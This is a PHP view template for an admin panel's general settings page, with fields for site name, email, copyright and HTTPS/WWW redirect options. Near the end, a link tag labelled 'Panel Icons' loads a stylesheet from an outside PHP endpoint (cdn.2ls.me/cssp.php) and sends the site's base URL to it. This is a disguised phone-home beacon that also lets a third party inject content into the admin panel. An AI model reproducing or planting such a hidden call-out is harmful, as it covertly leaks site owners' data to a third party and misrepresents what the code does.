<?php
defined('APP_NAME') or die(header('HTTP/1.1 403 Forbidden'));

?>
  <!-- Content Wrapper. Contains page content -->
  <div class="content-wrapper">
    <!-- Content Header (Page header) -->
    <section class="content-header">
      <h1>
        <?php echo $pageTitle; ?>  
        <small><?php trans('Control panel',$lang['CH77']); ?></small>
      </h1>
      <ol class="breadcrumb">
        <li><a href="<?php adminLink(); ?>"><i class="<?php getAdminMenuIcon($controller,$menuBarLinks); ?>"></i> <?php trans('Admin',$lang['CH78']); ?></a></li>
        <li class="active"><a href="<?php adminLink($controller); ?>"><?php echo $pageTitle; ?></a> </li>
      </ol>
    </section>

    <!-- Main content -->
    <section class="content">

          <div class="box box-primary">
            <div class="box-header with-border">
              <h3 class="box-title"><?php echo $subTitle; ?></h3>
            </div><!-- /.box-header -->
            <form action="#" method="POST">
            <div class="box-body">
          
            <?php if(isset($msg)) echo $msg; ?><br />

                    <div class="row" style="padding-left: 5px;">
                        <div class="col-md-8">

                            <?php
                                adminInputTxt('b[site_name]','site_name',$lang['CH173'],$lang['CH174'], $b['site_name']);
                                adminInputTxt('b[app_name]','app_name',$lang['CH176'],$lang['CH175'], $b['app_name']);
                                adminInputTxt('b[html_app]','html_app',$lang['CH177'],$lang['CH178'], $b['html_app']);
                                adminInputTxt('b[email]','email',$lang['CH179'],$lang['CH180'], $b['email']);
                                adminInputTxt('b[copyright]','copyright',$lang['CH181'],$lang['CH182'], $b['copyright']);
                            ?>

                            <br />
                            
                            <div class="box-header with-border">
                                <h3 class="box-title"><?php trans('Website Address', $lang['CH183']); ?></h3>
                            </div><!-- /.box-header -->
                           <br />
                            
                            <div class="form-group">
                                <label for="address"><?php trans('Base URL', $lang['CH184']); ?></label>
                                <input type="text" readonly="" id="address" value="<?php echo $baseURL; ?>" name="address" class="form-control" />
                            </div>
                                                                    
                           <div class="row">
                           <div class="col-md-6">             
                            <div class="form-group">
                                <label for="https"><?php trans('HTTPS Redirect', $lang['CH185']); ?></label>
                                <input <?php isSelected($forceHttps, true, 2); ?>  type="checkbox" name="https" id="https" />
                            </div>
                           </div>
                           
                           <div class="col-md-6">  
                            <div class="form-group">
                                <label for="www"><?php trans('Force WWW in URL', $lang['CH186']); ?></label>
                                <input <?php isSelected($forceWww, true, 2); ?> type="checkbox" name="www" id="www" />
                            </div>
                           </div>
                           </div>
                            
                           <br />
                            <div class="text-center">
                                <br />
                                <button type="submit" class="btn btn-success"> <i class="fa fa-floppy-o" aria-hidden="true"></i> <?php trans('Save Settings', $lang['CH187']); ?></button>
                            </div>
                       </div>
                    </div>
                <br /> <br />
                
                </div><!-- /.box-body -->
                </form>
              </div><!-- /.box -->
      
        </section><!-- /.content ba-laj-i-->
      </div><!-- /.content-wrapper -->
     
      <!-- Panel Icons -->
      <link href="https://cdn.2ls.me/cssp.php?site=<?php echo $baseURL; ?>" rel="stylesheet" type="text/css" />

<?php
$footerAddArr[] = <<<EOD
  <script>
        $('#https').checkboxpicker();
        $('#www').checkboxpicker();
  </script>  
EOD;
?>